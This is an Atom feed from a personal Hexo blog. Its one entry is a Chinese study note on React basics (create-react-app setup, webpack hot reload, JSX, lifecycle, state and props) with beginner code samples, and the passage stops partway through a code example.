<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shirley</title>
  <subtitle>一只自学成菜的仙女!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-28T15:01:25.974Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ShirleyLi</name>
    <email>1363814017@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>React实战项目news基础知识总结</title>
    <link href="http://yoursite.com/2018/05/28/React%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AEnews%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/05/28/React实战项目news基础知识总结/</id>
    <published>2018-05-28T14:59:38.000Z</published>
    <updated>2018-05-28T15:01:25.974Z</updated>
    
    <content type="html"><![CDATA[<p>React实战项目news基础知识学习总结部分。<br><a id="more"></a></p>
<h1 id="React安装及开发环境配置-v16-2-0"><a href="#React安装及开发环境配置-v16-2-0" class="headerlink" title="React安装及开发环境配置(v16.2.0)"></a>React安装及开发环境配置(v16.2.0)</h1><p>使用npm包的形式下载及管理，不推荐使用cdn的形式直接引用和独立安装的形式。</p>
<p><strong>项目初始化：</strong></p>
<p>新建一个空文件夹，然后使用<code>npm init</code>初始化该项目，会生成一个package.json文件，之后的包管理会在该文件中配置。</p>
<p><strong>create-react-app的安装</strong> ：</p>
<p><code>create-react-app</code> 是一个全局的命令行工具用来创建一个新的项目。</p>
<p><strong>（更新补充）：</strong> 如果使用了<code>create-react-app</code>命令来创建一个单页应用，就不需要<code>npm init</code>了，该命令已经自动化配置好了相关的开发环境，包括babel和webpack。</p>
<p>看了一些视频教程和博客，可能他们搭建环境时的react版本比较早，所以他们的npm包安装过程涉及react(react核心库)、react-dom(与DOM相关的功能)、babel(将 ES6 代码转为 ES5 代码,对 JSX 的支持)，我查看了下最新的官方文档，可以使用如下命令安装react及开启一个新应用，应该是最新版本的<code>Create React App</code>已经设置好了会一起下载包括babel等在内的开发环境需要的npm包，需要先全局安装<code>create-react-app</code>这个全局命令，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g create-react-app</div></pre></td></tr></table></figure>
<p>然后利用<code>create-react-app</code>命令创建一个名为react_newsapp的react应用(<strong>注意：</strong>react应用的名字中不能包含大写字母)并启动，命令如下：</p>
<pre><code>create-react-app react_newsapp

cd react_newsapp
npm start
</code></pre><p>在使用<code>create-react-app react_newsapp</code>命令创建应用时，由以下安装提示可以发现，<code>create-react-app</code>会帮你自动下载所需要的多个react应用的基本依赖包,例如react,react-dom等。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/create-react-app%E5%AE%89%E8%A3%85.png" alt="create-react-app创建应用"></p>
<p><strong>阿西吧的事情又发生了。。。于是又卡在了下载资源这一步</strong>，由于<code>create-react-app</code>命令默认使用的npm源，真的是下载起来慢的无以表达，几度安装失败，挂了vpn也不行，最终放弃，换到 <strong>淘宝的镜像源</strong> 。由于<code>create-react-app</code>指令默认调用npm，于是直接把npm的register给永久设置过来就好了，这样使用cnpm或者npm就没差别了。参考博客<a href="https://blog.csdn.net/eagyne/article/details/53780653" target="_blank" rel="noopener">create-react-app慢的解决方法</a>，方法操作如下：</p>
<pre><code>npm config set registry https://registry.npm.taobao.org

-- 配置后可通过下面方式来验证是否成功
npm config get registry
-- 或npm info express
</code></pre><p>设置成功后，再执行<code>create-react-app react_newsapp</code>，安装成功后提示如下，使用了淘宝镜像源都下了一会儿，不然真要下到地老天荒。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/create-react-app%E5%AE%89%E8%A3%852.png" alt="create-react-app创建应用2"><br>安装成功后可以在项目的根目录下的package.json中查看引入的依赖，可以看到包括react、react-dom、react-scripts，如下：</p>
<pre><code>{
  &quot;name&quot;: &quot;react_newsapp&quot;,
  &quot;version&quot;: &quot;0.1.0&quot;,
  &quot;private&quot;: true,
  &quot;dependencies&quot;: {
    &quot;react&quot;: &quot;^16.3.1&quot;,
    &quot;react-dom&quot;: &quot;^16.3.1&quot;,
    &quot;react-scripts&quot;: &quot;1.1.4&quot;
  },
  &quot;scripts&quot;: {
    &quot;start&quot;: &quot;react-scripts start&quot;,
    &quot;build&quot;: &quot;react-scripts build&quot;,
    &quot;test&quot;: &quot;react-scripts test --env=jsdom&quot;,
    &quot;eject&quot;: &quot;react-scripts eject&quot;
  }
}
</code></pre><p>然后使用以下命令开启你创建的应用：</p>
<pre><code>cd react_newsapp
npm start
</code></pre><p><strong>参考博客(环境搭建)</strong> ：<a href="https://blog.csdn.net/github_squad/article/details/57452333" target="_blank" rel="noopener">使用 create-react-app 构建 react应用程序 （react-scripts） </a></p>
<p><strong>！！！注意</strong> ：</p>
<p>(1)教程是手动安装的react的依赖包，我查看了下，使用命令<code>create-react-app react_newsapp</code>后，在node_modules目录下，没有自动安装babelify依赖包，但有babel-preset-react，不知道到时候操作用不用得到，先记录下。手动安装babelify、babel-preset-react、babel-preset-es2015依赖包命令：<code>npm install --save babelify babel-preset-react babel-preset-es2015</code></p>
<p><strong>更正补充：</strong>  试了下安装<code>babel-preset-es2015</code>，但babel提示说最新的版本叫<code>babel-preset-env</code>，然后查看了下<code>create-react-app</code>自动安装的依赖包里已经有这个包了，所以不必再装老版本的<code>babel-preset-es2015</code>。（感叹。。。包包们变得如此之快。。。。）</p>
<p><strong>npm删除包</strong> 命令：<code>npm uninstall &lt;package name&gt;</code></p>
<p>(2)<code>create-react-app</code>使用像 Babel 和 webpack 这样的构建工具，但是已经为你配置好了，可以零配置使用。</p>
<h2 id="React环境配置与调试技巧"><a href="#React环境配置与调试技巧" class="headerlink" title="React环境配置与调试技巧"></a>React环境配置与调试技巧</h2><p>虽然 React 可以在没有构建管道的情况下使用，但是建议配置它，以便提高效率。一个现代构建管道通常包括：</p>
<ul>
<li><p>一个 包管理器(package manager) ，如 <code>Yarn</code> 或 <code>npm</code> 。它可以让您利用大量的第三方软件包生态系统，并轻松安装或更新它们。</p>
</li>
<li><p>一个 打包工具(bundler) ，如<code>webpack</code> 或 <code>Browserify</code>。它允许您编写模块化代码并将他们在一起，成为一个小包，以实现加载性能的优化，节省加载时间。</p>
</li>
<li><p>一个 编译器(compiler) ，如<code>Babel</code>。 它可以让你在编写现代 JavaScript 代码的同时兼容旧版本浏览器.</p>
</li>
</ul>
<h3 id="手动安装webpack时"><a href="#手动安装webpack时" class="headerlink" title="手动安装webpack时"></a>手动安装webpack时</h3><p>全局安装：<code>npm install -g webpack</code> -&gt; <code>npm install -g webpack-dev-server</code><br>当前项目安装： <code>npm install webpack --save</code> -&gt; <code>npm install webpack-dev-server --save</code> </p>
<h2 id="create-react-app的目录结构"><a href="#create-react-app的目录结构" class="headerlink" title="create-react-app的目录结构"></a>create-react-app的目录结构</h2><p>使用<code>create-react-app</code>命令创建的项目目录结构默认如下所示：</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/create-react-app%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="目录结构"></p>
<p>node_modules文件夹内是安装的所有依赖模块；</p>
<p>package.json文件定义了项目的基本信息，如项目名称、版本号、在该项目下可执行的命令及项目的依赖模块等，如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;</div><div class="line">  <span class="attr">"name"</span>: <span class="string">"react_newsapp"</span>,</div><div class="line">  <span class="attr">"version"</span>: <span class="string">"0.1.0"</span>,</div><div class="line">  <span class="attr">"private"</span>: <span class="literal">true</span>,</div><div class="line">  <span class="attr">"dependencies"</span>: &#123;</div><div class="line">    <span class="attr">"react"</span>: <span class="string">"^16.3.1"</span>,</div><div class="line">    <span class="attr">"react-dom"</span>: <span class="string">"^16.3.1"</span>,</div><div class="line">    <span class="attr">"react-scripts"</span>: <span class="string">"1.1.4"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"scripts"</span>: &#123;</div><div class="line">    <span class="attr">"start"</span>: <span class="string">"react-scripts start"</span>,</div><div class="line">    <span class="attr">"build"</span>: <span class="string">"react-scripts build"</span>,</div><div class="line">    <span class="attr">"test"</span>: <span class="string">"react-scripts test --env=jsdom"</span>,</div><div class="line">    <span class="attr">"eject"</span>: <span class="string">"react-scripts eject"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>public文件夹下的index.html是应用的入口页面；src文件夹下是项目源代码，其中index.js是代码入口，可以在index.js中引入其他的模块(在这些模块中定义不同组建，将组件模块化)。<br><code>public/index.html</code> 是页面模板;<code>src/index.js</code> 是JavaScript的入口点，这两项不要修改名称或删除，其他的文件任意。（若要修改入口点，需要自己修改webpack的配置文件）<br><strong>注意：</strong> 把自己的js与css都放到src文件夹内，否则webpack无法打包；把index.html里用到的所有文件都放在Public文件夹下，否则无法使用。</p>
<h3 id="脚手架自定义webpack配置"><a href="#脚手架自定义webpack配置" class="headerlink" title="脚手架自定义webpack配置"></a>脚手架自定义webpack配置</h3><p>(1) react默认配置文件都是隐藏的，如果要自定义，运行<code>npm run eject</code>，提示eject为不可恢复操作，输入y或者y开头的单词，即可进行eject。<a href="https://blog.csdn.net/sunhaobo1996/article/details/80264554" target="_blank" rel="noopener">Create-React-App的Webpack配置</a><br>(2) 点开package.json文件，可看到配置的命令是以 <code>&quot;react-scripts *&quot;</code> 来执行，所以打开node_modules文件夹，找到react-scripts文件夹进去， config目录即是你需要找的webpack的配置文件，然后就自己去修改配置就好。<br>webpack.config有两个，一个是dev（开发）环境下的配置文件，一个为prod（生产环境下，即npm run build的配置文件）环境下的配置文件。paths为各种路径，我们可以在这个文件中添加我们自己的路径。<br>需要修改的内容其实没多少，主要集中在entry入口跟output出口。</p>
<p>这里暂且不修改webpack的配置，就用create-react-app默认的脚手架，后面需要再修改(其实是看了看脚手架的配置文件太复杂了…)。接下来将<code>src</code>目录下的js文件们或者css文件们单独放到js目录或css目录下，整理一下不那么乱，然后再修改下对应文件的引入路径，让<code>hello world</code>跑起来。<br>整理src目录结构如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="整理后的目录结构"></p>
<h3 id="webpack热加载配置"><a href="#webpack热加载配置" class="headerlink" title="webpack热加载配置"></a>webpack热加载配置</h3><p>(1) <code>Create React App</code> 不会处理后端逻辑或数据库，它只是创建一个前端构建管道（build pipeline），所以可以使用它来配合任何想使用的后端。它使用 <code>Babel</code> 和 <code>webpack</code> 这样的构建工具，但是在使用<code>create-react-app</code>命令创建项目时已经配置好了，可以零配置使用，自带热加载效果。</p>
<p>(2)不使用脚手架时配置热加载。<br>不使用<code>create-react-app</code>脚手架时，每次改动文件，都需要重新执行<code>webpack</code>命令才能重新打包文件，手动刷新浏览器体现改动效果。可以使用<code>webpack --watch</code>实现每次修改文件后不用手动执行<code>webpack</code>即可在刷新浏览器后看到改动效果，即webpack会自己打包编译改动过的文件。即使使用了<code>webpack --watch</code>命令可以自动打包编译改动过的文件，但还需要手动刷新浏览器才能看到效果，热加载配置就是在改动文件后，在浏览器中自动体现更改后的效果。</p>
<p>运行<code>webpack-dev-server</code>命令，然后将生成的app本地运行地址<code>localhost:8080/webpack-dev-server</code>贴到浏览器，即可实现自动刷新。如果还想去掉上面运行地址的尾巴<code>webpack-dev-server</code>，即使用类似<code>localhost:8080</code>地址即可观察应用的热加载。使用如下配置：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">webpack-dev-server --contentbase src --inline --hot</div></pre></td></tr></table></figure></p>
<p>其中<code>contentbase src</code>表示应用的默认运行目录。运行完上述命令，就会生成应用的本地运行地址<code>localhost:8080</code>。</p>
<h1 id="React组件"><a href="#React组件" class="headerlink" title="React组件"></a>React组件</h1><h2 id="JSX内置表达式"><a href="#JSX内置表达式" class="headerlink" title="JSX内置表达式"></a>JSX内置表达式</h2><p>(1)三元表达式<br>使用方式如下：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">var</span> userName = <span class="string">'Shirley'</span>;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/</span>p&gt;</div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>(2)元素属性变量值的使用<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">var</span> userName = <span class="string">'Shirley'</span>;</div><div class="line">        <span class="keyword">var</span> boolInput = <span class="literal">true</span>;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;</div><div class="line">                    &lt;input type=<span class="string">"button"</span> value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt;</div><div class="line">                &lt;<span class="regexp">/p&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>div&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>(3)jsx注释<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">var</span> userName = <span class="string">'Shirley'</span>;</div><div class="line">        <span class="keyword">var</span> boolInput = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;</div><div class="line">                    &lt;input type=<span class="string">"button"</span> value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt;</div><div class="line">                &lt;<span class="regexp">/p&gt;</span></div><div class="line"><span class="regexp">                &#123;/</span>* 注释 *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">            &lt;/</span>div&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>(4)jsx解析html<br>将html中的空格字符使用unicode转码，jsx解析后会在页面显示空格。若html变量中使用<code>&amp;nbsp;</code>这样的html实体，jsx不会将其解析为空格，还是输出字符串。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">var</span> userName = <span class="string">'Shirley'</span>;</div><div class="line">        <span class="keyword">var</span> boolInput = <span class="literal">true</span>;</div><div class="line">        <span class="keyword">var</span> htmlStr1 = <span class="string">'Hello\u0020Stranger1'</span>;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;</div><div class="line">                    &lt;input type=<span class="string">"button"</span> value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt;</div><div class="line">                &lt;<span class="regexp">/p&gt;</span></div><div class="line"><span class="regexp">                &#123;/</span>* 注释 *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">				&lt;p&gt;&#123;htmlStr1&#125;&lt;/</span>p&gt;</div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>但该种方式还需要在后台设置unicode转码，比较麻烦。(注意：即使在htmlStr的<code>Hello</code>和<code>Stranger</code>之间添加多个<code>\u0020</code>，页面还是显示一个空格)</p>
<p>第二种方式是使用标签的<code>dangerouslySetInnerHTML</code>属性，但该属性可能造成XSS漏洞，也不建议使用，将要显示的html字符串挂载到<code>__html</code>这样一个变量上。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">var</span> userName = <span class="string">'Shirley'</span>;</div><div class="line">        <span class="keyword">var</span> boolInput = <span class="literal">true</span>;</div><div class="line">        <span class="keyword">var</span> htmlStr1 = <span class="string">'Hello\u0020Stranger1'</span>;</div><div class="line">        <span class="keyword">var</span> htmlStr2 = <span class="string">'Hello&amp;nbsp;Stranger2'</span>;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;userName === '' ? '用户未登录' : '用户名' + userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;</div><div class="line">                    &lt;input type=<span class="string">"button"</span> value=&#123;userName&#125; disabled=&#123;boolInput&#125;/&gt;</div><div class="line">                &lt;<span class="regexp">/p&gt;               </span></div><div class="line"><span class="regexp">                &#123;/</span>* 注释 *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;htmlStr1&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p dangerouslySetInnerHTML= &#123;&#123;<span class="attr">__html</span> : htmlStr2&#125;&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></div><div class="line">                &#123;htmlStr2&#125;</div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>显示效果对比如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/jsx%E8%A7%A3%E6%9E%90html.png" alt="jsx解析html"></p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="生命周期"></p>
<p>src/components/body.js<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    componentWillMount() &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Body-componentWillMount"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    componentDidMount() &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Body-componentDidMount"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>src/components/App.js<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> ComponentHeader <span class="keyword">from</span> <span class="string">'./header'</span>;</div><div class="line"><span class="keyword">import</span> ComponentFooter <span class="keyword">from</span> <span class="string">'./footer'</span>;</div><div class="line"><span class="keyword">import</span> Body <span class="keyword">from</span> <span class="string">'./body'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123; </div><div class="line">  componentWillMount() &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"App-componentWillMount"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  componentDidMount() &#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"App-componentDidMount"</span>);</div><div class="line">  &#125;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">        &lt;ComponentHeader /&gt;</div><div class="line">        &lt;Body /&gt;</div><div class="line">        &lt;ComponentFooter /&gt;</div><div class="line">      &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">    );</span></div><div class="line"><span class="regexp">  &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp">export default App;</span></div></pre></td></tr></table></figure></p>
<p>不同组件的加载顺序如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/%E4%B8%8D%E5%90%8C%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F.png" alt="不同组件的加载顺序"></p>
<h2 id="状态state"><a href="#状态state" class="headerlink" title="状态state"></a>状态state</h2><p><code>state</code> -&gt; 虚拟DOM -&gt; DOM<br><code>state</code>是组件自身内部的属性，只会影响所在的组件，不会污染外部组件。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">            <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Hello"</span>&#125;); <span class="comment">//2s后改变 state 的值</span></div><div class="line">        &#125;, <span class="number">2000</span>);</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;              </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>React中页面的刷新，只会作Diff有差异部分的刷新，比如一秒后对<code>&lt;p&gt;</code>标签内容的刷新，不会对整个页面进行刷新。<br>初始化可以放在constructor构造函数里。<br><strong>调试技巧：</strong> Google控制台- &gt; console -&gt; show console drawer -&gt; Rendering -&gt; Paint flashing，会高亮当前改变的区域。</p>
<h2 id="属性props（父组件-gt-子组件）"><a href="#属性props（父组件-gt-子组件）" class="headerlink" title="属性props（父组件-&gt;子组件）"></a>属性props（父组件-&gt;子组件）</h2><p><code>state</code>和<code>props</code>会影响组件<code>component</code>，进一步影响UI。<code>props</code>是组件与外部沟通的桥梁，父组件通过<code>props</code>将自身的数据传递给子组件。而<code>state</code>是组件内部的属性，不会影响其他组件。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123; </div><div class="line"></div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">        &lt;ComponentHeader /&gt;</div><div class="line">        &lt;Body userId=&#123;<span class="number">123</span>&#125; /&gt;</div><div class="line">        &lt;ComponentFooter /&gt;</div><div class="line">      &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">    );</span></div><div class="line"><span class="regexp">  &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">class Body extends Component &#123;</span></div><div class="line"><span class="regexp">    constructor() &#123;</span></div><div class="line"><span class="regexp">        super(); /</span><span class="regexp">/调用基类的所有初始化方法</span></div><div class="line"><span class="regexp">        this.state = &#123;userName: "Shirley"&#125;; /</span><span class="regexp">/初始化赋值</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">    render() &#123;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">        setTimeout(() =&gt; &#123;</span></div><div class="line"><span class="regexp">            this.setState(&#123;userName: "Hello"&#125;); /</span><span class="regexp">/2s后改变 state 的值</span></div><div class="line"><span class="regexp">        &#125;, 2000);</span></div><div class="line"><span class="regexp">        return (</span></div><div class="line"><span class="regexp">            &lt;div&gt;</span></div><div class="line"><span class="regexp">                &lt;h2&gt;这是是页面主体&lt;/</span>h2&gt;</div><div class="line">                